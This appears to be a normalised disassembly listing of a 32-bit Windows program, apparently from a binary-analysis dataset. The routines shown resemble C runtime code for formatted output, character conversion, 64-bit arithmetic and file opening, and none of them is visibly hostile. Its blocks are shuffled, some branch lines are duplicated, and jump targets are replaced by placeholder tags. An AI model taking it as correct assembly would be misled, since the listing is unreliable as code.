mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x434 ]
test ecx ecx
je r-xdata
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
cmp [ ebp - 0x440 ] 0x0
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov edi [ ebp - 0x434 ]
imul eax eax 0x9
movzx edi [ eax + edi + r--data ]
mov eax edi
shr eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x8
je r-xdata
je r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_418e40 ]
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_412628
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_40e8f2
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_41268a
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_41265e
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_418e60
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x464 ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_41602d
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_418ffa
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_41268a
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_41265e
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_41100b
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_410750
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_41265e
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x464 ]
call sub_412628
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_419110
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x464 ]
push ecx
push eax
call sub_418ffa
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_418e75
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0xc ] 0x40
jne r-xdata
add [ edi + 0x4 ] 0xfffffffe
js r-xdata
push edi
call sub_412f82
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push edi
push eax
call sub_41c918
pop ecx
pop ecx
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ edi ] 0x2
jmp r-xdata
mov eax ebx
push edi
call sub_412f82
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
push edi
call sub_412f82
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_412f82
mov esi eax
push edi
sar esi 0x5
call sub_412f82
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_412f82
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push edi
call sub_412f82
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_412f82
mov esi eax
push edi
sar esi 0x5
call sub_412f82
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
test [ ebx + 0x4 ] 0x80
je r-xdata
push edi
call sub_412f82
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41c8fd
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_412f82
mov esi eax
push edi
sar esi 0x5
call sub_412f82
mov ebx eax
and ebx 0x1f
pop ecx
shl ebx 0x6
add ebx [ esi * 4 + rw-data ]
pop ecx
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ edi + 0x4 ]
js r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_41174f
pop ecx
pop ecx
mov ecx eax
mov ecx [ edi ]
mov al [ ebp + esi - 0xc ]
mov [ ecx ] al
mov eax [ edi ]
movzx ecx [ eax ]
inc eax
mov [ edi ] eax
jmp r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_418ffa
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40f858
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_41602d
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_411550
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_419110
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4191a5
push ebp
mov ebp esp
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
movzx eax ax
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_4191f7
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
push 0x30
pop ecx
cmp ax cx
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov edx 0xff10
cmp ax dx
jae r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
mov ecx 0xff1a
mov edx 0x660
cmp ax dx
jb r-xdata
movzx eax ax
sub eax edx
pop ebp
retn
lea ecx [ edx + 0xa ]
cmp ax cx
jae r-xdata
mov edx 0x6f0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x966
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xc66
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xe50
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
mov edx 0x1040
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x17e0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x30
cmp ax dx
jb r-xdata
add ecx 0x30
jmp r-xdata
cmp ax cx
jb r-xdata
sub_4193a0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4193d4
push 0x10
push r--data
call sub_4110a0
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419468
mov eax edi
call sub_4110e5
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_40ecae
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_40e8f2
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_419471
push ebp
mov ebp esp
sub esp 0x1c
push esi
call sub_414e1b
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
or eax [ ebp + 0x20 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
mov [ ebp - 0x1c ] 0x18
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
call sub_414e1b
test eax eax
mov eax [ ebp + 0x1c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_419502
push 0x14
push r--data
call sub_4110a0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_411550
push 0x16
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_4110e5
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_4195c9
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41959d
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_41959d
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_41a3f7
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_4195c9
push ebp
mov ebp esp
sub esp 0x38
push ebx
xor ebx ebx
test [ ebp + 0x14 ] 0x80
push edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x38 ] 0xc
mov [ ebp - 0x34 ] ebx
je r-xdata
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411724
int3
mov ecx [ ebp + 0x14 ]
mov eax 0x8000
test eax ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_41cc2c
pop ecx
test eax eax
jne r-xdata
mov eax ecx
and eax 0x3
mov edx 0xc0000000
sub eax ebx
je r-xdata
test ecx 0x74000
jne r-xdata
mov edi 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0xc ] ebx
sub eax esi
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
